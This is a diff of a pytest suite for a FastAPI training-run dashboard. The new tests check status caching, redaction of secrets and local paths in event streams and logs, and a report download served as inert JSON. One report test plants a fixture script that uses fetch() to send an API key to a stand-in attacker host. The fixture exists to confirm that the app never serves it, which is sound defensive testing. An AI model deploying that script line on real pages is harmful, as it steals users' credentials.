@@ -1,11 +1,12 @@
 from __future__ import annotations
 
 import json
+from collections.abc import Callable
 from pathlib import Path
 from typing import Any
 
 import pytest
-from fastapi import APIRouter
+from fastapi import APIRouter, Request
 from fastapi.responses import HTMLResponse
 from fastapi.testclient import TestClient
 
@@ -26,7 +27,7 @@ from spritelab.product_core import (
 from spritelab.product_web import cli as web_cli
 from spritelab.product_web.app import create_app
 from spritelab.product_web.components import bar_chart, distribution, image_gallery, line_chart, run_timeline
-from spritelab.product_web.events import EventRepository
+from spritelab.product_web.events import EventRepository, sanitize_public_text
 from spritelab.v3.config import ProjectConfig
 
 
@@ -66,6 +67,7 @@ def _plugin(
     router_text: str | None = "Dataset plugin page",
     extra_navigation: tuple[WebNavigationItem, ...] = (),
     assets: tuple[WebAssetBundle, ...] = (),
+    status_provider: Callable[[ProjectContext], ProductResult] | None = None,
 ) -> ProductPlugin:
     def router_factory(_context: ProjectContext) -> APIRouter:
         router = APIRouter()
@@ -80,7 +82,7 @@ def _plugin(
         plugin_id=plugin_id,
         title=title,
         cli_registration=lambda _registry: None,
-        status_provider=lambda _context: result or _result(),
+        status_provider=status_provider or (lambda _context: result or _result()),
         capability_probe=lambda _context: capabilities,
         web_router_factory=router_factory if router_text is not None else None,
         navigation=(WebNavigationItem(plugin_id, title, path, 15), *extra_navigation),
@@ -89,30 +91,127 @@ def _plugin(
     )
 
 
+def test_home_computes_each_plugin_status_once_per_request(tmp_path: Path) -> None:
+    context = _context(tmp_path)
+    calls = {"dataset.demo": 0, "training.demo": 0}
+
+    def counted(plugin_id: str) -> Callable[[ProjectContext], ProductResult]:
+        def status_provider(_context: ProjectContext) -> ProductResult:
+            calls[plugin_id] += 1
+            return _result()
+
+        return status_provider
+
+    app = create_app(
+        context,
+        plugins=(
+            _plugin(status_provider=counted("dataset.demo")),
+            _plugin(
+                plugin_id="training.demo",
+                title="Training",
+                path="/training",
+                status_provider=counted("training.demo"),
+            ),
+        ),
+    )
+    client = TestClient(app)
+
+    assert calls == {"dataset.demo": 0, "training.demo": 0}
+    assert client.get("/").status_code == 200
+    assert calls == {"dataset.demo": 1, "training.demo": 1}
+    assert client.get("/").status_code == 200
+    assert calls == {"dataset.demo": 2, "training.demo": 2}
+
+
+def test_plugin_template_shell_skips_cross_plugin_status_and_run_replay(
+    monkeypatch: pytest.MonkeyPatch,
+    tmp_path: Path,
+) -> None:
+    context = _context(tmp_path)
+    calls = {"dataset.demo": 0, "training.demo": 0, "current_run": 0}
+
+    def counted_status(plugin_id: str) -> Callable[[ProjectContext], ProductResult]:
+        def status_provider(_context: ProjectContext) -> ProductResult:
+            calls[plugin_id] += 1
+            return _result()
+
+        return status_provider
+
+    def current_run(_repository: EventRepository) -> None:
+        calls["current_run"] += 1
+        return None
+
+    def router_factory(_context: ProjectContext) -> APIRouter:
+        router = APIRouter()
+
+        @router.get("/dataset", response_class=HTMLResponse)
+        async def plugin_page(request: Request) -> Any:
+            renderer = request.app.state.spritelab_render_plugin_template
+            return renderer(
+                request,
+                "dataset.demo",
+                "technical_details.html",
+                {"stack": (), "plugin_titles": ()},
+            )
+
+        return router
+
+    monkeypatch.setattr(EventRepository, "current_run", current_run)
+    dataset = ProductPlugin(
+        plugin_id="dataset.demo",
+        title="Dataset",
+        cli_registration=lambda _registry: None,
+        status_provider=counted_status("dataset.demo"),
+        capability_probe=lambda _context: (),
+        web_router_factory=router_factory,
+        navigation=(WebNavigationItem("dataset", "Dataset", "/dataset", 10),),
+        web_assets=(WebAssetBundle("spritelab.product_web"),),
+    )
+    training = _plugin(
+        plugin_id="training.demo",
+        title="Training",
+        path="/training",
+        status_provider=counted_status("training.demo"),
+    )
+    client = TestClient(create_app(context, plugins=(dataset, training)))
+
+    response = client.get("/dataset")
+
+    assert response.status_code == 200
+    assert "Technical details" in response.text
+    assert calls == {"dataset.demo": 0, "training.demo": 0, "current_run": 0}
+
+
+def test_home_reuses_one_current_run_projection(
+    monkeypatch: pytest.MonkeyPatch,
+    tmp_path: Path,
+) -> None:
+    context = _context(tmp_path)
+    current_run_calls = 0
+
+    def current_run(_repository: EventRepository) -> None:
+        nonlocal current_run_calls
+        current_run_calls += 1
+        return None
+
+    monkeypatch.setattr(EventRepository, "current_run", current_run)
+    client = TestClient(create_app(context, plugins=(_plugin(),)))
+
+    assert client.get("/").status_code == 200
+    assert current_run_calls == 1
+
+
 def _write_run(
     context: ProjectContext,
     *,
     run_id: str = "20260713T100000Z-train-demo",
     terminal: bool = False,
     secret_log: bool = False,
+    second_metrics: dict[str, Any] | None = None,
 ) -> tuple[str, list[ProductEvent]]:
     assert context.runs_directory is not None
     directory = context.runs_directory / run_id
-    (directory / "logs").mkdir(parents=True)
-    (directory / "report").mkdir()
     status = ProductStatus.COMPLETE if terminal else ProductStatus.RUNNING
-    state = {
-        "schema_version": "spritelab.v3.run-state.v1",
-        "run_id": run_id,
-        "command": "training",
-        "stage": "optimize-model",
-        "status": status.value,
-        "started_at": "2026-07-13T10:00:00+00:00",
-        "ended_at": "2026-07-13T10:02:00+00:00" if terminal else None,
-        "resumable": not terminal,
-        "message": "Training complete." if terminal else "Training sprites.",
-    }
-    (directory / "state.json").write_text(json.dumps(state), encoding="utf-8")
     events = [
         ProductEvent(
             run_id=run_id,
@@ -135,12 +234,30 @@ def _write_run(
             current=100 if terminal else 40,
             total=100,
             message="Training complete." if terminal else "Processed batch 40.",
-            metrics={"loss": 0.42, "pause_available": not terminal, "cancel_available": not terminal},
+            metrics={
+                "loss": 0.42,
+                "pause_available": not terminal,
+                "cancel_available": not terminal,
+                **(second_metrics or {}),
+            },
             artifact_references=(r"C:\example\checkpoint.safetensors",),
         ),
     ]
-    (directory / "events.jsonl").write_text(
-        "".join(json.dumps(event.to_dict()) + "\n" for event in events), encoding="utf-8"
+    repository = EventRepository(context.runs_directory)
+    repository.initialize_run(
+        run_id,
+        feature="training",
+        command="training",
+        command_payload={},
+        planned_event=events[0],
+        started_at=events[0].timestamp,
+        resumable=not terminal,
+    )
+    repository.append(events[1])
+    repository.update_state(
+        run_id,
+        ended_at=events[1].timestamp if terminal else None,
+        resumable=not terminal,
     )
     log = "step=40 loss=0.42\n"
     if secret_log:
@@ -149,6 +266,75 @@ def _write_run(
     if terminal:
         (directory / "report" / "index.html").write_text("<h1>Offline report</h1>", encoding="utf-8")
     return run_id, events
+
+
+def test_runs_page_reuses_full_projection_for_older_active_run(
+    monkeypatch: pytest.MonkeyPatch,
+    tmp_path: Path,
+) -> None:
+    context = _context(tmp_path)
+    repository = EventRepository(context.runs_directory)
+
+    def initialize_run(run_id: str, *, started_at: str, terminal: bool) -> None:
+        status = ProductStatus.COMPLETE if terminal else ProductStatus.RUNNING
+        repository.initialize_run(
+            run_id,
+            feature="training",
+            command="training",
+            command_payload={},
+            planned_event=ProductEvent(
+                run_id=run_id,
+                timestamp=started_at,
+                feature="training",
+                stage="optimize-model",
+                event_type="run_finished" if terminal else "progress",
+                status=status,
+                current=100 if terminal else 40,
+                total=100,
+                message="Training complete." if terminal else "Training sprites.",
+            ),
+            started_at=started_at,
+            resumable=not terminal,
+        )
+
+    active_run_id = "20260713T090000Z-train-active"
+    initialize_run(
+        active_run_id,
+        started_at="2026-07-13T09:00:00+00:00",
+        terminal=False,
+    )
+    terminal_run_ids: list[str] = []
+    for minute in range(21):
+        run_id = f"20260714T10{minute:02d}00Z-train-terminal"
+        terminal_run_ids.append(run_id)
+        initialize_run(
+            run_id,
+            started_at=f"2026-07-14T10:{minute:02d}:00+00:00",
+            terminal=True,
+        )
+
+    original_recent_runs = EventRepository.recent_runs
+    recent_run_limits: list[int] = []
+
+    def recent_runs(repository: EventRepository, *, limit: int = 20) -> list[Any]:
+        recent_run_limits.append(limit)
+        return original_recent_runs(repository, limit=limit)
+
+    def unexpected_current_run(_repository: EventRepository) -> None:
+        raise AssertionError("/runs must derive the current run from its existing projection")
+
+    monkeypatch.setattr(EventRepository, "recent_runs", recent_runs)
+    monkeypatch.setattr(EventRepository, "current_run", unexpected_current_run)
+
+    response = TestClient(create_app(context)).get("/runs")
+
+    assert response.status_code == 200
+    assert recent_run_limits == [100]
+    assert f'href="/runs/{active_run_id}"' in response.text
+    assert f"{active_run_id}</small>" not in response.text
+    assert "20 shown" in response.text
+    assert terminal_run_ids[0] not in response.text
+    assert terminal_run_ids[-1] in response.text
 
 
 def test_app_starts_on_loopback_and_v3_dispatches_to_web(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
@@ -289,12 +475,28 @@ def test_home_answers_readiness_and_recommends_training(tmp_path: Path) -> None:
 
 def test_sse_events_replay_reconnect_and_filter_secret_metrics(tmp_path: Path) -> None:
     context = _context(tmp_path)
-    run_id, _events = _write_run(context)
-    directory = context.runs_directory / run_id  # type: ignore[operator]
-    lines = (directory / "events.jsonl").read_text(encoding="utf-8").splitlines()
-    second = json.loads(lines[1])
-    second["metrics"]["auth_token"] = "do-not-return"
-    (directory / "events.jsonl").write_text(lines[0] + "\n" + json.dumps(second) + "\n", encoding="utf-8")
+    hostile_values = {
+        "privateKey": "EVENT-PRIVATE-KEY-VALUE",
+        "accessKey": "EVENT-ACCESS-KEY-VALUE",
+        "awsAccessKeyId": "EVENT-AWS-ACCESS-KEY-ID-VALUE",
+        "privateKeyPem": "EVENT-PRIVATE-KEY-PEM-VALUE",
+        "apiKeyId": "EVENT-API-KEY-ID-VALUE",
+        "clientSecretId": "EVENT-CLIENT-SECRET-ID-VALUE",
+        "Private Key": "EVENT-SPACED-PRIVATE-KEY-VALUE",
+        "Access-Key": "EVENT-HYPHEN-ACCESS-KEY-VALUE",
+        "sig": "EVENT-SIGNED-URL-SECRET",
+    }
+    run_id, _events = _write_run(
+        context,
+        second_metrics={
+            "auth_token": "do-not-return",
+            **hostile_values,
+            "hostileNested": {"awsAccessKeyId": "EVENT-NESTED-ACCESS-KEY-VALUE"},
+            "publicKey": "documented",
+            "secretary": "available",
+            "tokenizer": "bpe",
+        },
+    )
     client = TestClient(create_app(context, event_poll_interval=0.01))
     all_events = client.get(f"/api/runs/{run_id}/events?once=true")
     assert all_events.status_code == 200
@@ -304,6 +506,269 @@ def test_sse_events_replay_reconnect_and_filter_secret_metrics(tmp_path: Path) -
     assert "Preparing images" not in reconnect.text
     assert "Processed batch 40" in reconnect.text
     assert "do-not-return" not in reconnect.text
+    for key, secret_value in hostile_values.items():
+        assert key not in reconnect.text
+        assert secret_value not in reconnect.text
+    assert "EVENT-NESTED-ACCESS-KEY-VALUE" not in reconnect.text
+    assert "hostileNested" not in reconnect.text
+    reconnect_payloads = [
+        json.loads(line.removeprefix("data: ")) for line in reconnect.text.splitlines() if line.startswith("data: ")
+    ]
+    public_metrics = next(payload["metrics"] for payload in reconnect_payloads if "event_type" in payload)
+    assert public_metrics["publicKey"] == "documented"
+    assert public_metrics["secretary"] == "available"
+    assert public_metrics["tokenizer"] == "bpe"
+
+
+@pytest.mark.parametrize(
+    ("private_text", "expected"),
+    (
+        (
+            "Keep this prefix; credential_reference=credential-value-9Z-secret; keep this suffix.",
+            "Keep this prefix; credential_reference=[redacted]; keep this suffix.",
+        ),
+        (
+            "Keep this prefix; password_hash='password-value-9Z-secret'; keep this suffix.",
+            "Keep this prefix; password_hash=[redacted]; keep this suffix.",
+        ),
+        (
+            "Keep this prefix; client_secret_id: client-value-9Z-secret; keep this suffix.",
+            "Keep this prefix; client_secret_id: [redacted]; keep this suffix.",
+        ),
+        (
+            "Keep this prefix; awsAccessKeyId=aws-value-9Z-private; keep this suffix.",
+            "Keep this prefix; awsAccessKeyId=[redacted]; keep this suffix.",
+        ),
+        (
+            "Keep this prefix; privateKeyPem='pem-value-9Z-private'; keep this suffix.",
+            "Keep this prefix; privateKeyPem=[redacted]; keep this suffix.",
+        ),
+        (
+            "Keep this prefix; apiKeyId: api-id-value-9Z-private; keep this suffix.",
+            "Keep this prefix; apiKeyId: [redacted]; keep this suffix.",
+        ),
+        (
+            "Keep this prefix; clientSecretId=client-id-value-9Z-private; keep this suffix.",
+            "Keep this prefix; clientSecretId=[redacted]; keep this suffix.",
+        ),
+        (
+            "Keep this prefix; Private Key: private-value-9Z-private; keep this suffix.",
+            "Keep this prefix; Private Key: [redacted]; keep this suffix.",
+        ),
+        (
+            "Keep this prefix; Access Key: access-value-9Z-private; keep this suffix.",
+            "Keep this prefix; Access Key: [redacted]; keep this suffix.",
+        ),
+        (
+            "Safe fields publicKey=documented secretary=available tokenizer=bpe remain visible.",
+            "Safe fields publicKey=documented secretary=available tokenizer=bpe remain visible.",
+        ),
+        (
+            "Read file:///home/alice/private/model.pt; then retry.",
+            "Read file://<local-path>; then retry.",
+        ),
+        (
+            "Read file:///C:/Users/Alice/private/model.pt, then retry.",
+            "Read file://<local-path>, then retry.",
+        ),
+        (
+            "Read file://server/private/model.pt; then retry.",
+            "Read file://<local-path>; then retry.",
+        ),
+        (
+            "Read path:/home/alice/private/model.pt; then retry.",
+            "Read path:<local-path>; then retry.",
+        ),
+        (
+            "Read source=//server/share/private/model.pt; then retry.",
+            "Read source=<local-path>; then retry.",
+        ),
+        (
+            "Download https://blob.example.test/object?sv=1&sig=AZURESASSECRET&se=tomorrow.",
+            "Download https://blob.example.test/object?sv=1&sig=[redacted]&se=tomorrow.",
+        ),
+        (
+            "-----BEGIN OPENSSH PRIVATE KEY-----\nPRIVATEKEYSECRET\n-----END OPENSSH PRIVATE KEY-----",
+            "[redacted]",
+        ),
+        (
+            "Prefix -----BEGIN PRIVATE KEY-----\nTRUNCATEDPRIVATEKEYSECRET",
+            "Prefix [redacted]",
+        ),
+        (
+            "-----BEGIN CERTIFICATE-----\nPUBLICCERTIFICATE\n-----END CERTIFICATE-----",
+            "-----BEGIN CERTIFICATE-----\nPUBLICCERTIFICATE\n-----END CERTIFICATE-----",
+        ),
+        (
+            "The signal=strong value and signature algorithm documentation remain visible.",
+            "The signal=strong value and signature algorithm documentation remain visible.",
+        ),
+        (
+            "Documentation remains at https://example.test/public/model.pt.",
+            "Documentation remains at https://example.test/public/model.pt.",
+        ),
+    ),
+)
+def test_public_text_redacts_suffix_secret_keys_and_file_uris(
+    private_text: str,
+    expected: str,
+) -> None:
+    assert sanitize_public_text(private_text) == expected
+
+
+def test_sse_projections_redact_paths_and_secrets_without_mutating_durable_bytes(tmp_path: Path) -> None:
+    context = _context(tmp_path)
+    assert context.runs_directory is not None
+    run_id = "20260714T120000Z-training-private-metric"
+    checkpoint = context.project_root / "artifacts" / "checkpoint_step_500.pt"
+    bearer_secret = "bearer-value-9Z-secret"
+    api_secret = "api-value-9Z-secret"
+    credential_secret = "credential-value-9Z-secret"
+    password_secret = "password-value-9Z-secret"
+    raw_secret = "sk-abcdefghijklmnopqrstuvwxyz1234567890"
+    stage_secret = "STAGESECRET"
+    feature_secret = "FEATURESECRET"
+    event_type_secret = "EVENTTYPESECRET"
+    artifact_secret = "SUPERSECRET"
+    credential_reference_secret = "CREDENTIALREFERENCESECRET"
+    password_hash_secret = "PASSWORDHASHSECRET"
+    client_secret_id_secret = "CLIENTSECRETIDSECRET"
+    private_posix_uri = "file:///home/alice/private/model.pt"
+    private_windows_uri = "file:///C:/Users/Alice/private/model.pt"
+    message = (
+        f"Authorization: Bearer {bearer_secret} API_KEY={api_secret} credential={credential_secret} "
+        f"credential_reference={credential_reference_secret} source={private_posix_uri} raw={raw_secret}"
+    )
+    event = ProductEvent(
+        run_id=run_id,
+        timestamp="2026-07-14T12:00:00+00:00",
+        feature=f"training Authorization=Bearer {feature_secret}",
+        stage=f"Authorization=Bearer {stage_secret}",
+        event_type=f"checkpoint api_key={event_type_secret}",
+        status=ProductStatus.RUNNING,
+        current=500,
+        total=5000,
+        message=message,
+        metrics={
+            "checkpoint": str(checkpoint),
+            "checkpoint_note": f"Saved checkpoint at {checkpoint}; password='{password_secret}'",
+            "external_windows_checkpoint": r"D:\private\outside_checkpoint.pt",
+            "external_posix_checkpoint": "/private/outside_checkpoint.pt",
+            "api_key": api_secret,
+            "provider_detail": raw_secret,
+            "endpoint": f"https://sprite-user:{password_secret}@example.test/api",
+            "safe_label": "seed 1",
+            r"C:/private/metric": "bounded",
+        },
+        artifact_references=(f"C:/private/api_key={artifact_secret}.pt",),
+    )
+    repository = EventRepository(context.runs_directory, private_roots=(context.project_root,))
+    repository.initialize_run(
+        run_id,
+        feature="training",
+        command="training",
+        command_payload={},
+        planned_event=event,
+        started_at=event.timestamp,
+        resumable=True,
+    )
+    event_path = context.runs_directory / run_id / "events.jsonl"
+    state_path = context.runs_directory / run_id / "state.json"
+    log_path = context.runs_directory / run_id / "logs" / "run.log"
+    log_path.write_text(
+        f"Authorization=Bearer {bearer_secret} api_key={api_secret} credential={credential_secret} "
+        f"password_hash={password_hash_secret} client_secret_id={client_secret_id_secret} "
+        f"source={private_windows_uri}\n",
+        encoding="utf-8",
+    )
+    canonical_before = event_path.read_bytes()
+    state_before = state_path.read_bytes()
+    log_before = log_path.read_bytes()
+    assert json.loads(canonical_before)["metrics"]["checkpoint"] == str(checkpoint)
+    for secret in (
+        bearer_secret,
+        api_secret,
+        credential_secret,
+        password_secret,
+        raw_secret,
+        stage_secret,
+        feature_secret,
+        event_type_secret,
+        artifact_secret,
+        credential_reference_secret,
+        password_hash_secret,
+        client_secret_id_secret,
+    ):
+        assert secret.encode() in canonical_before + state_before + log_before
+
+    client = TestClient(create_app(context))
+    response = client.get(f"/api/runs/{run_id}/events?once=true")
+    log_response = client.get(f"/api/runs/{run_id}/logs?once=true")
+    run_page = client.get(f"/runs/{run_id}")
+    current_run = client.get("/api/current-run")
+
+    assert response.status_code == 200
+    assert log_response.status_code == 200
+    assert run_page.status_code == 200
+    assert current_run.status_code == 200
+    for secret in (
+        bearer_secret,
+        api_secret,
+        credential_secret,
+        password_secret,
+        raw_secret,
+        stage_secret,
+        feature_secret,
+        event_type_secret,
+        artifact_secret,
+        credential_reference_secret,
+        password_hash_secret,
+        client_secret_id_secret,
+    ):
+        assert secret not in response.text
+        assert secret not in log_response.text
+        assert secret not in run_page.text
+        assert secret not in current_run.text
+    assert "[redacted]" in response.text
+    assert "[redacted]" in log_response.text
+    assert private_posix_uri not in response.text
+    assert private_windows_uri not in log_response.text
+    assert "file://<local-path>" in response.text
+    assert "file://<local-path>" in log_response.text
+    payloads = [
+        json.loads(line.removeprefix("data: ")) for line in response.text.splitlines() if line.startswith("data: ")
+    ]
+    event_payload = next(payload for payload in payloads if "event_type" in payload)
+    snapshot_payload = next(payload for payload in payloads if "terminal" in payload)
+    assert event_payload["feature"] == "training Authorization=[redacted]"
+    assert event_payload["stage"] == "Authorization=[redacted]"
+    assert event_payload["event_type"] == "checkpoint api_key=[redacted]"
+    assert snapshot_payload["feature"] == "training Authorization=[redacted]"
+    assert snapshot_payload["stage"] == "Authorization=[redacted]"
+    assert snapshot_payload["timeline"][0]["stage"] == "Authorization=[redacted]"
+    assert event_payload["artifact_references"] == ["api_key=[redacted]"]
+    assert snapshot_payload["artifacts"] == ["api_key=[redacted]"]
+    assert "[redacted]" in event_payload["message"]
+    assert "[redacted]" in snapshot_payload["message"]
+    assert "[redacted]" in snapshot_payload["recent_messages"][0]
+    assert "[redacted]" in snapshot_payload["timeline"][0]["message"]
+    public_metrics = [payload["metrics"] for payload in payloads if isinstance(payload.get("metrics"), dict)]
+    assert len(public_metrics) == 2
+    for metrics in public_metrics:
+        assert str(context.project_root) not in metrics["checkpoint"]
+        assert context.project_root.as_posix() not in metrics["checkpoint"]
+        assert str(context.project_root) not in metrics["checkpoint_note"]
+        assert context.project_root.as_posix() not in metrics["checkpoint_note"]
+        assert metrics["external_windows_checkpoint"] == "outside_checkpoint.pt"
+        assert metrics["external_posix_checkpoint"] == "outside_checkpoint.pt"
+        assert "api_key" not in metrics
+        assert metrics["provider_detail"] == "[redacted]"
+        assert metrics["endpoint"] == "https://[redacted]@example.test/api"
+        assert metrics["safe_label"] == "seed 1"
+        assert metrics["metric"] == "bounded"
+    assert event_path.read_bytes() == canonical_before
+    assert state_path.read_bytes() == state_before
+    assert log_path.read_bytes() == log_before
 
 
 def test_completed_run_is_reconstructed_with_timeline_artifacts_logs_and_report(tmp_path: Path) -> None:
@@ -317,7 +782,117 @@ def test_completed_run_is_reconstructed_with_timeline_artifacts_logs_and_report(
     assert "Prepare Data" in page.text
     assert "checkpoint.safetensors" in page.text
     assert str(context.project_root) not in page.text
-    assert client.get(f"/runs/{run_id}/report").status_code == 200
+    report = client.get(f"/runs/{run_id}/report")
+    assert report.status_code == 200
+    assert report.headers["content-type"].startswith("application/json")
+    assert "-public-report.json" in report.headers["content-disposition"]
+    assert ".html" not in report.headers["content-disposition"]
+
+
+def test_report_download_is_a_closed_inert_projection_and_never_serves_source_html(tmp_path: Path) -> None:
+    context = _context(tmp_path)
+    run_id, _events = _write_run(context, terminal=True)
+    assert context.runs_directory is not None
+    source = context.runs_directory / run_id / "report" / "index.html"
+    hostile = (
+        "<script>fetch('https://attacker.invalid/?api_key=REPORTSECRET')</script>"
+        f"<p>{context.project_root}</p><p>C:\\Users\\Alice\\private.txt</p>"
+        "<p>file:///home/alice/private.txt</p>"
+    ).encode()
+    source.write_bytes(hostile)
+    expected_snapshot = EventRepository(
+        context.runs_directory,
+        private_roots=(context.project_root,),
+    ).snapshot(run_id)
+    client = TestClient(create_app(context))
+
+    response = client.get(f"/runs/{run_id}/report")
+
+    assert response.status_code == 200
+    assert response.headers["content-type"].startswith("application/json")
+    assert response.headers["content-disposition"] == f'attachment; filename="{run_id}-public-report.json"'
+    assert response.headers["x-content-type-options"] == "nosniff"
+    assert response.headers["content-security-policy"] == "sandbox; default-src 'none'"
+    assert response.headers["cache-control"] == "no-store"
+    assert "<script>" not in response.text
+    assert "REPORTSECRET" not in response.text
+    assert str(context.project_root) not in response.text
+    assert "C:\\Users\\Alice" not in response.text
+    assert "file:///home/alice" not in response.text
+    payload = response.json()
+    assert set(payload) == {
+        "schema_version",
+        "run_id",
+        "feature",
+        "stage",
+        "status",
+        "message",
+        "progress",
+        "timing",
+        "event_count",
+        "terminal",
+        "resumable",
+        "report_available",
+        "invalid_event_count",
+    }
+    assert payload["schema_version"] == "spritelab.product.public-run-report.v1"
+    assert payload["run_id"] == run_id
+    assert payload["status"] == expected_snapshot.status
+    assert payload["progress"] == {"current": 100, "total": 100, "percent": 100}
+    assert payload["terminal"] is expected_snapshot.terminal
+    assert payload["report_available"] is expected_snapshot.report_available
+    assert source.read_bytes() == hostile
+
+
+def test_unverified_event_bytes_never_reach_sse_or_public_report(tmp_path: Path) -> None:
+    context = _context(tmp_path)
+    run_id, _events = _write_run(context, terminal=True)
+    assert context.runs_directory is not None
+    repository = EventRepository(context.runs_directory, private_roots=(context.project_root,))
+    assert repository.replay(run_id).integrity_status == "VALID"
+
+    event_path = context.runs_directory / run_id / "events.jsonl"
+    lines = event_path.read_text(encoding="utf-8").splitlines()
+    hostile = json.loads(lines[-1])
+    hostile["current"] = 99
+    hostile["message"] = "UNVERIFIED EVENT MESSAGE"
+    hostile["metrics"]["pause_available"] = True
+    event_path.write_text(
+        "\n".join([*lines[:-1], json.dumps(hostile)]) + "\n",
+        encoding="utf-8",
+        newline="\n",
+    )
+    tampered_bytes = event_path.read_bytes()
+
+    client = TestClient(create_app(context, event_poll_interval=0.01))
+    events_response = client.get(f"/api/runs/{run_id}/events?once=true")
+    report_response = client.get(f"/runs/{run_id}/report")
+
+    assert events_response.status_code == 200
+    assert "event: product" not in events_response.text
+    assert "UNVERIFIED EVENT MESSAGE" not in events_response.text
+    payloads = [
+        json.loads(line.removeprefix("data: "))
+        for line in events_response.text.splitlines()
+        if line.startswith("data: ")
+    ]
+    warning = next(item for item in payloads if item.get("code") == "unverified_product_events")
+    assert warning["invalid_event_count"] == 0
+    snapshot = next(item for item in payloads if "terminal" in item)
+    assert snapshot["status"] in {"NOT_COMPARABLE", "STALE"}
+    assert snapshot["current"] == 0
+    assert snapshot["total"] is None
+    assert snapshot["event_count"] == 0
+    assert snapshot["resumable"] is False
+
+    assert report_response.status_code == 200
+    report = report_response.json()
+    assert report["status"] in {"NOT_COMPARABLE", "STALE"}
+    assert report["progress"] == {"current": 0, "total": None, "percent": None}
+    assert report["event_count"] == 0
+    assert report["resumable"] is False
+    assert "UNVERIFIED EVENT MESSAGE" not in report_response.text
+    assert event_path.read_bytes() == tampered_bytes
 
 
 def test_live_progress_counters_eta_messages_and_action_visibility(tmp_path: Path) -> None:
